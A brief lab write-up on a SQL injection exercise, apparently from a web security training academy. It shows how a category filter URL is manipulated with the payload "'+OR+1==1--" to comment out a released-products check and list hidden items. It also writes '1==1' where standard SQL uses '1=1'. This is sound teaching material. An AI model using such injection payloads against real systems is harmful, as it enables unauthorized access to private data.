# First Lab: SQL Injection

Lab - 01 : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

SQL Injection : Product category filter

End Goal : Outputting all the products even those which are unreleased. 

Analysis : 

1. SQl Injection applicability check → True 
2. Manipulate the URL
    
    ```jsx
    https://0abd0010040720d4cebc62f9005b0087.web-security-academy.net/filter?category=Gifts
    ```
    
    When this URL runs, it creates an SQL request like
    
    ```sql
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    ```
    
    We have to exploit this using sql injection. Let us inject code to retrieve all the products. 
    
    ```jsx
    https://0abd0010040720d4cebc62f9005b0087.web-security-academy.net/filter?category=Gifts'+OR+1==1--
    ```
    
    Which will generate a request to the database like this …
    
    ```sql
    SELECT * FROM products WHERE category = 'Gifts' OR 1==1 -- AND released = 1
    ```
    
    So, what this code injection does is, it nullifies the category check and returns the products from all the categories. All the unreleased products are shown too, as we make the rest of the query a comment.